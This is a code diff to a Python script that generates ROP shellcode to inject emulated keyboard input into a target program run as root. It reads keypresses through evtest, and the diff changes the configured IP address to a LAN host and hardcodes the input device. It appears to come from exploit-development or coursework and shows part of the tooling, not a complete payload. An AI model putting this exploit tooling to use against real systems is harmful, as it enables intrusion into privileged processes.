@@ -10,7 +10,9 @@ from rop_shellcode import GenerateROPShellcode
 This program is to create ROP code for to emulate keyboard input events.
 You require the event number for the keyboard and the program to exploited needs to be run as su.
 This program also needs to be run as SU to detect key presses on the fly.
-evtest needs to be installed. On a Debian system you can do that with sudo apt-get install evtest
+evtest needs to be installed. On a Debian system you can do that with 
+	sudo apt-get install evtest
+Also change the event number for your keyboard in the program - line 264
 """
 
 mapping = {}
@@ -244,7 +246,7 @@ def main():
     generator.file_name = 'src/simple_client.c'
     generator.line_num = 11
     # Create two members for the object so that the ip_addr and port_no can be accessed anywhere
-    generator.ip_addr = '127.0.0.1'
+    generator.ip_addr = '192.168.1.4'
     generator.port_no = '10000'
 
     # generator.libc_base = hex(int(str(raw_input('Enter the libc base (format - 0xdeadbeef): ')).replace('L', ''), 16))
@@ -259,7 +261,7 @@ def main():
     # generator.port_no = str(raw_input('Port number: '))
 
     open_file(file_name='/dev/input/event' + sys.argv[1])
-    proc = subprocess.Popen(['evtest', '/dev/input/event' + sys.argv[1]], stdout=subprocess.PIPE)
+    proc = subprocess.Popen(['evtest', '/dev/input/event3'], stdout=subprocess.PIPE)
     expr = re.compile(r'Event: time [0-9]*\.[0-9]*, type [0-9]+ \(EV_KEY\), code ([0-9]+) \(KEY_([A-Z0-9]+)\), value 1')
     keys = []
     send_keypresses()
